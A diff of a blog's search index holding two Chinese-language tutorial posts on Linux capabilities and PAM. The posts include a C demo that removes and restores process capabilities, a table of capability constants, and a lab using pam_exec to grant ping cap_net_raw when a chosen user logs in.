+<li>设置/bin/ping权能为cap_net_raw+ei，使得可以继承<ul>
+<li>sudo setcap cap_net_raw+ei /bin/ping</li>
+</ul>
+</li>
+<li>设置当前的进程的权能有cap_net_raw+i权能</li>
+</ul>
+<p>永久删除子进程的权能就移除effective和inheritable、permitted的，暂时性删除就移除effective和inheritable的，恢复暂时性删除的就添加进effective和inheritable。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _POSIX_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> errno;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">whoami</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uid=%i  euid=%i  gid=%i\n"</span>, getuid(), geteuid(), getgid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listCaps</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">cap_t</span> caps = cap_get_proc();</span><br><span class="line">    <span class="keyword">ssize_t</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The Process %d was give capabilities %s\n"</span>,(<span class="keyword">int</span>) getpid(), cap_to_text(caps, &amp;y));</span><br><span class="line">    fflush(<span class="number">0</span>);</span><br><span class="line">    cap_free(caps);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_ping</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">		whoami();</span><br><span class="line">		listCaps();</span><br><span class="line">		execlp(<span class="string">"ping"</span>,<span class="string">"ping"</span>,<span class="string">"-c 1"</span>,<span class="string">"localhost"</span>,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid() != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"请使用sudo执行本程序"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">cap_value_t</span> cap_values[] = &#123;CAP_SETUID, CAP_SETGID, CAP_SETPCAP ,CAP_NET_RAW&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">cap_t</span> caps = cap_init();</span><br><span class="line">    cap_set_flag(caps, CAP_PERMITTED, <span class="number">4</span>, cap_values, CAP_SET);</span><br><span class="line">	cap_set_flag(caps, CAP_EFFECTIVE, <span class="number">4</span>, cap_values, CAP_SET);</span><br><span class="line">    cap_set_proc(caps);</span><br><span class="line">    prctl(PR_SET_KEEPCAPS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    cap_free(caps);</span><br><span class="line"></span><br><span class="line">    setgid(<span class="number">1000</span>);</span><br><span class="line">	setuid(<span class="number">1000</span>);</span><br><span class="line">	</span><br><span class="line">    caps = cap_get_proc();</span><br><span class="line">    cap_set_flag(caps, CAP_EFFECTIVE, <span class="number">4</span>, cap_values, CAP_SET);</span><br><span class="line">	cap_set_flag(caps, CAP_INHERITABLE, <span class="number">4</span>, cap_values, CAP_SET);</span><br><span class="line">    cap_set_proc(caps);</span><br><span class="line">    cap_free(caps);</span><br><span class="line">	whoami();</span><br><span class="line">	listCaps();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\n------权能测试小程序------\n\</span></span><br><span class="line"><span class="string">请输入如下字符:\n\</span></span><br><span class="line"><span class="string">1 : 永久的删除其子进程的某个权能\n\</span></span><br><span class="line"><span class="string">2 : 暂时性的删除其子进程的某个权能\n\</span></span><br><span class="line"><span class="string">3 : 暂时性删除的权能重新获得\n\</span></span><br><span class="line"><span class="string">4 : ping -c 1 localhost\n\</span></span><br><span class="line"><span class="string">5 : 查看当前权能\n\</span></span><br><span class="line"><span class="string">q : 退出\n\</span></span><br><span class="line"><span class="string">---------------------------\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">line</span>[<span class="number">128</span>];</span><br><span class="line">	printInfo();</span><br><span class="line">	<span class="keyword">while</span>(fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>), <span class="built_in">stdin</span>))&#123;</span><br><span class="line">		<span class="keyword">char</span> cmd = <span class="built_in">line</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(cmd == <span class="string">'1'</span> || cmd == <span class="string">'2'</span> || cmd == <span class="string">'3'</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"输入要操作的权能名，如cap_net_raw\n"</span>);</span><br><span class="line">			fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>), <span class="built_in">stdin</span>);</span><br><span class="line">			<span class="built_in">line</span>[<span class="built_in">strlen</span>(<span class="built_in">line</span>) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">			<span class="keyword">cap_value_t</span> temp;</span><br><span class="line">			<span class="keyword">if</span>(cap_from_name(<span class="built_in">line</span>, &amp;temp) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Error capability name\n"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">cap_t</span> caps = cap_get_proc();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(cmd == <span class="string">'3'</span>)&#123;</span><br><span class="line">					cap_set_flag(caps, CAP_EFFECTIVE, <span class="number">1</span>, &amp;temp, CAP_SET);</span><br><span class="line">					cap_set_flag(caps, CAP_INHERITABLE, <span class="number">1</span>, &amp;temp, CAP_SET);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					cap_set_flag(caps, CAP_EFFECTIVE, <span class="number">1</span>, &amp;temp, CAP_CLEAR);</span><br><span class="line">					cap_set_flag(caps, CAP_INHERITABLE, <span class="number">1</span>, &amp;temp, CAP_CLEAR);</span><br><span class="line">					<span class="keyword">if</span>(cmd == <span class="string">'1'</span>)</span><br><span class="line">						cap_set_flag(caps, CAP_PERMITTED, <span class="number">1</span>, &amp;temp, CAP_CLEAR);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(cap_set_proc(caps))</span><br><span class="line">					perror(<span class="string">"cap_set_proc() ERROR: "</span>);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"%s %s success\n"</span>, (cmd ==<span class="string">'3'</span>? <span class="string">"recover"</span>:<span class="string">"remove"</span>),<span class="built_in">line</span>);</span><br><span class="line"></span><br><span class="line">				cap_free(caps);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd == <span class="string">'4'</span>)</span><br><span class="line">			do_ping();</span><br><span class="line"> 		<span class="keyword">else</span> <span class="keyword">if</span>(cmd == <span class="string">'5'</span>)</span><br><span class="line">			listCaps();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd == <span class="string">'q'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">       sleep(<span class="number">1</span>);  <span class="comment">//休眠1s</span></span><br><span class="line">		printInfo();</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序测试：</p>
+<p>测试环境：</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_052.png" alt="选区_052"></p>
+<p>运行程序前：<code>sudo setcap cap_net_raw+eip /bin/ping</code>  保证文件有<code>eip</code> 权能</p>
+<ul>
+<li>sudo apt install libcap-dev</li>
+</ul>
+<ul>
+<li>gcc cap.c -lcap -o cap</li>
+<li>sudo ./cap</li>
+</ul>
+<p>一开始可以<code>ping</code> :</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_053.png" alt="选区_053"></p>
+<p>暂时性删除权能后无法<code>ping</code> :</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_054.png" alt="选区_054"></p>
+<p>恢复后可以<code>ping</code>  :</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_055.png" alt="选区_055"></p>
+<p>永久删除后无法<code>ping</code> :</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_056.png" alt="选区_056"></p>
+<blockquote>
+<p>参考资料：</p>
+<p><a href="https://www.hrwhisper.me/introduction-to-linux-capability/#comments" target="_blank" rel="noopener">Linux setuid与权能介绍</a></p>
+<p><a href="https://www.wolfcstech.com/2017/07/10/linux-capabilities-overview/" target="_blank" rel="noopener">Linux 权能综述</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>capability</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux权能与PAM机制</title>
+    <url>/2018/05/01/Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<blockquote>
+<p>实验环境：<code>uname -a</code></p>
+<p>​      <code>Linux ubuntu 4.4.0-121-generic #145-Ubuntu SMP Fri Apr 13 13:47:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</code></p>
+</blockquote>
+<hr>
+<h3 id="权能对应的系统调用"><a href="#权能对应的系统调用" class="headerlink" title="权能对应的系统调用"></a>权能对应的系统调用</h3><p>使用 <code>sudo find / -name capability.h</code> 查找到路径 <code>/usr/src/linux-headers-4.4.0-121/include/uapi/linux/capbility.h</code>  ，整理可得下表：</p>
+<a id="more"></a>
+
+<table>
+<thead>
+<tr>
+<th>权能</th>
+<th>编号(相关系统调用）</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CAP_CHOWN</td>
+<td>0(chown)</td>
+<td>对文件的UIDs和GIDs做任意修改</td>
+</tr>
+<tr>
+<td>CAP_DAC_OVERRIDE</td>
+<td>1</td>
+<td>忽略对文件的DAC访问限制</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>2</td>
+<td>忽略DAC中对文件和目录的读、搜索权限</td>
+</tr>
+<tr>
+<td>CAP_FOWNER</td>
+<td>3</td>
+<td>忽略进程UID与文件UID的匹配检查</td>
+</tr>
+<tr>
+<td>CAP_FSETID</td>
+<td>4</td>
+<td>文件修改时不清除setuid和setgid位，不匹配时设置setgid位</td>
+</tr>
+<tr>
+<td>CAP_KILL</td>
+<td>5(kill)</td>
+<td>绕过发送信号时的权限检查</td>
+</tr>
+<tr>
+<td>CAP_SETGID</td>
+<td>6(setgid)</td>
+<td>设置或管理进程GID</td>
+</tr>
+<tr>
+<td>CAP_SETUID</td>
+<td>7(setuid)</td>
+<td>管理或设置进程UID</td>
+</tr>
+<tr>
+<td>CAP_SETPCAP</td>
+<td>8(capset)</td>
+<td>允许授予或删除其他进程的任何权能</td>
+</tr>
+<tr>
+<td>CAP_LINUX_IMMUTABLE</td>
+<td>9(chattr)</td>
+<td>允许设置文件的不可修改位(IMMUTABLE)和只添加(APPND-ONLY)属性</td>
+</tr>
+<tr>
+<td>CAP_NET_BIND_SERVICE</td>
+<td>10</td>
+<td>允许绑定到小于1024的端口</td>
+</tr>
+<tr>
+<td>CAP_NET_BROADCAST</td>
+<td>11</td>
+<td>允许socket发送监听组播</td>
+</tr>
+<tr>
+<td>CAP_NET_ADMIN</td>
+<td>12</td>
+<td>允许执行网络管理任务</td>
+</tr>
+<tr>
+<td>CAP_NET_RAW</td>
+<td>13(socket)</td>
+<td>允许使用原始套接字</td>
+</tr>
+<tr>
+<td>CAP_IPC_LOCK</td>
+<td>14(mlock)</td>
+<td>允许锁定共享内存片段</td>
+</tr>
+<tr>
+<td>CAP_IPC_OWNER</td>
+<td>15</td>
+<td>忽略IPC所有权检查</td>
+</tr>
+<tr>
+<td>CAP_SYS_MOUDLE</td>
+<td>16(init_module)</td>
+<td>插入和删除内核模块</td>
+</tr>
+<tr>
+<td>CAP_SYS_RAWIO</td>
+<td>17</td>
+<td>允许对ioperm/iopl的访问</td>
+</tr>
+<tr>
+<td>CAP_SYS_CHROOT</td>
+<td>18(chroot)</td>
+<td>允许使用chroot()系统调用</td>
+</tr>
+<tr>
+<td>CAP_SYS_PTRACE</td>
+<td>19(ptrace)</td>
+<td>允许跟踪任何进程</td>
+</tr>
+<tr>
+<td>CAP_SYS_PACCT</td>
+<td>20(acct)</td>
+<td>允许配置进程记账</td>
+</tr>
+<tr>
+<td>CAP_SYS_ADMIN</td>
+<td>21</td>
+<td>允许执行系统管理任务</td>
+</tr>
+<tr>
+<td>CAP_SYS_BOOT</td>
+<td>22(reboot)</td>
+<td>允许重新启动系统</td>
+</tr>
+<tr>
+<td>CAP_SYS_NICE</td>
+<td>23(nice)</td>
+<td>允许提升优先级，设置其他进程优先级</td>
+</tr>
+<tr>
+<td>CAP_SYS_RESOURCE</td>
+<td>24(setrlimit)</td>
+<td>设置资源限制</td>
+</tr>
+<tr>
+<td>CAP_SYS_TIME</td>
+<td>25(stime)</td>
+<td>允许改变系统时钟</td>
+</tr>
+<tr>
+<td>CAP_SYS_TTY_CONFIG</td>
+<td>26(vhangup)</td>
+<td>允许配置TTY设备</td>
+</tr>
+<tr>
+<td>CAP_MKNOD</td>
+<td>27(mknod)</td>
+<td>允许使用mknod()系统调用，创建特殊文件</td>
+</tr>
+<tr>
+<td>CAP_LEASE</td>
+<td>28(fcntl)</td>
+<td>为任意文件建立租约</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_WRITE</td>
+<td>29</td>
+<td>允许向内核审计日志写记录</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_CONTROL</td>
+<td>30</td>
+<td>启用或禁用内核审计，修改审计过滤器规则</td>
+</tr>
+<tr>
+<td>CAP_SETFCAP</td>
+<td>31</td>
+<td>设置文件权能</td>
+</tr>
+<tr>
+<td>CAP_MAC_OVERRIDE</td>
+<td>32</td>
+<td>允许MAC配置或状态改变，为smack LSM实现</td>
+</tr>
+<tr>
+<td>CAP_MAC_ADMIN</td>
+<td>33</td>
+<td>覆盖强制访问控制</td>
+</tr>
+<tr>
+<td>CAP_SYSLOG</td>
+<td>34(syslog)</td>
+<td>执行特权syslog(2)操作</td>
+</tr>
+<tr>
+<td>CAP_WAKE_ALARM</td>
+<td>35</td>
+<td>触发将唤醒系统的东西</td>
+</tr>
+<tr>
+<td>CAP_BLOCK_SUSPEND</td>
+<td>36(epoll)</td>
+<td>可以阻塞系统挂起的特性</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_READ</td>
+<td>37</td>
+<td>允许通过一个多播socket读取审计日志</td>
+</tr>
+</tbody></table>
+<p>详情见<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener">man capabilities</a> 。</p>
+<hr>
+<h3 id="基于PAM用户权限设置系统"><a href="#基于PAM用户权限设置系统" class="headerlink" title="基于PAM用户权限设置系统"></a>基于PAM用户权限设置系统</h3><p>PAM 的全称为“可插拔认证模块（Pluggable Authentication Modules）”。设计的初衷是将不同的底层认证机制集中到一个高层次的API中，从而省去开发人员自己去设计和实现各种繁杂的认证机制的麻烦。</p>
+<p>PAM认证一般遵循这样的顺序：Service(服务)→PAM(配置文件)→pam_*.so，PAM配置文件在<code>/etc/pam.d/</code> 目录下，原理图如下：</p>
+<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/pam.png" alt="pam"></p>
+<p>PAM中配置字段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">moudle_type  control_flag  moudle_path moudle_option&#x2F;moudle_args</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>module_type</code> 为 相应服务指定模块类型</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>模块类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>auth(验证模块)</td>
+<td>用于验证用户或设置/销毁凭证</td>
+</tr>
+<tr>
+<td>account(帐户管理模块)</td>
+<td>将执行与访问、帐户及凭证有效期、密码限制/规则等有关的操作</td>
+</tr>
+<tr>
+<td>session(会话管理模块)</td>
+<td>定义用户登录前的,及用户退出后所要进行的操作.如:登录连接信息,用户数据的打开与关闭,挂载文件系统等</td>
+</tr>
+<tr>
+<td>passwd(密码管理模块)</td>
+<td>将执行与密码更改/更新有关的操作</td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li>control_flag 将指定模块的堆栈行为，配置文件中列出模块被调用的顺序</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>控制标记</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>required</td>
+<td>堆栈中的所有 required 模块必须看作一个成功的结果。如果一个或多个 required 模块失败，则实现堆栈中的所有 required 模块，但是将返回第一个错误</td>
+</tr>
+<tr>
+<td>requisite</td>
+<td>如果本模块没有被满足，那本次认证一定失败，而且整个栈立即中止并返回错误信号</td>
+</tr>
+<tr>
+<td>sufficient</td>
+<td>如果标记为 sufficient 的模块成功并且先前没有 required 或 sufficient 模块失败，则忽略堆栈中的所有其余模块并返回成功</td>
+</tr>
+<tr>
+<td>optional</td>
+<td>如果堆栈中没有一个模块是 required 并且没有任何一个 sufficient 模块成功，则服务/应用程序至少要有一个 optional 模块成功</td>
+</tr>
+<tr>
+<td>include</td>
+<td>包含其他规则（服务），文件嵌套，可以互相调用，如：login，auth，system-auth等</td>
+</tr>
+<tr>
+<td>[value1=action1  value2=action2 ….]</td>
+<td>六种动作：ok ，done，bad，die，ignore，reset。</td>
+</tr>
+</tbody></table>
+<p>​        Example：auth [user_unknown=ignore success=ok ignore=ignore default=bad] pam_securetty.so</p>
+<ol start="3">
+<li><code>module_path</code> 将指定实现模块的库对象的路径名称。默认情况下，它将被设为 <code>/lib/security</code>。        <img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/libpam.png" alt="libpam"></li>
+<li>module_options/module_args（可选字段）将指定可以传递给服务模块的选项或实参。</li>
+</ol>
+<hr>
+<p>实验：配置用户<code>userping</code> ，设置<code>cap_net_raw</code> 权能。</p>
+<ul>
+<li>添加用户<code>userping</code>  :  <code>sudo adduser userping</code> </li>
+<li>查看并清除<code>/bin/ping</code> 的权能：</li>
+</ul>
+<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_057.png" alt="选区_057"></p>
+<ul>
+<li>切换到用户<code>userping</code> 再<code>ping</code> 无法<code>ping</code>   : <code>su userping</code> </li>
+<li><code>userping</code> 登录时给<code>/bin/ping</code> 添加权能：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####################################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> File Name: ping_cap.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Author: xsyin</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mail: shouyinXu@163.com</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Created Time: 2018年04月30日 星期一 16时05分57秒</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###################################################</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">[ "$PAM_TYPE" == "open_session" ] || exit 0</span><br><span class="line"></span><br><span class="line">if [ "$PAM_USER" == "userping" ]; then</span><br><span class="line">	setcap cap_net_raw=eip /bin/ping</span><br><span class="line">	echo "SUCCESS"</span><br><span class="line">else</span><br><span class="line">	echo "FAILURE"</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将<code>ping_cap.sh</code> 移动到 <code>/usr/local/bin</code> 路径下，并设置为可执行：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chmod u+x &#x2F;usr&#x2F;loca&#x2F;bin&#x2F;ping_cap.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>所有登录都使用<code>common-session</code> 模块：</li>
+</ul>
+<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_058.png" alt="选区_058"></p>
+<p>因此在<code>common-session</code> 模块中添加规则: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session  optional  pam_exec.so debug log&#x3D;&#x2F;tmp&#x2F;pam_exec.log seteuid &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ping_cap.sh</span><br></pre></td></tr></table></figure>
+
+<p>必须模块，开启了<code>debug</code>模式，用户<code>userping</code> 每次登录会执行<code>ping_cap.sh</code></p>
+<ul>
+<li>切换到<code>userping</code> 用户：</li>
+</ul>
+<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_059.png" alt="选区_059"></p>
+<p>出错多次，最终调试成功：</p>
+<p><img src="Linux%E6%9D%83%E8%83%BD%E4%B8%8EPAM%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_061.png" alt="选区_060"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>优点：<code>userping</code> 用户无法执行特权命令，通过<code>pam</code> 可赋予一些特权操作。</p>
+<p>缺点：本实验中修改了<code>ping</code> 的文件权能，影响了其他用户。退出<code>userping</code> 后，<code>ping</code> 命令变成有效了。</p>
+<p>过渡C版本：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">    &gt; File Name: ping_cap.c</span></span><br><span class="line"><span class="comment">    &gt; Author: xsyin</span></span><br><span class="line"><span class="comment">    &gt; Mail: shouyinXu@163.com </span></span><br><span class="line"><span class="comment">    &gt; Created Time: 2018年04月30日 星期一 14时56分35秒</span></span><br><span class="line"><span class="comment">    &gt; Make: gcc ping_cap.c -lcap -o ping_cap</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _POSIX_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> errno;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *path_p = <span class="string">"/bin/ping"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listCaps</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">cap_t</span> caps = cap_get_file(path_p);</span><br><span class="line">    <span class="keyword">ssize_t</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The file %s was give capabilities %s\n"</span>,path_p, cap_to_text(caps, &amp;y));</span><br><span class="line">    fflush(<span class="number">0</span>);</span><br><span class="line">    cap_free(caps);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(uid != <span class="number">1000</span>) </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"uid:%d\n"</span>, uid);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">cap_value_t</span> cap_values[] = &#123;CAP_NET_RAW&#125;;</span><br><span class="line">	<span class="keyword">cap_t</span> caps = cap_init();</span><br><span class="line">	cap_set_flag(caps,CAP_PERMITTED,<span class="number">1</span>,cap_values,CAP_SET);</span><br><span class="line">	cap_set_flag(caps,CAP_EFFECTIVE,<span class="number">1</span>,cap_values,CAP_SET);</span><br><span class="line">	cap_set_flag(caps,CAP_INHERITABLE,<span class="number">1</span>,cap_values,CAP_SET);</span><br><span class="line">	<span class="keyword">if</span>(cap_set_file(path_p,caps))</span><br><span class="line">		perror(<span class="string">"cap_set_file() ERROR: "</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"success\n"</span>);</span><br><span class="line">	cap_free(caps);</span><br><span class="line">	listCaps();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>缺陷：未搞清楚如何获取PAM正在授权的用户，无法判断切换至<code>userping</code> 用户时设置权能。</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux capability</tag>
+      </tags>
+  </entry>
+</search>
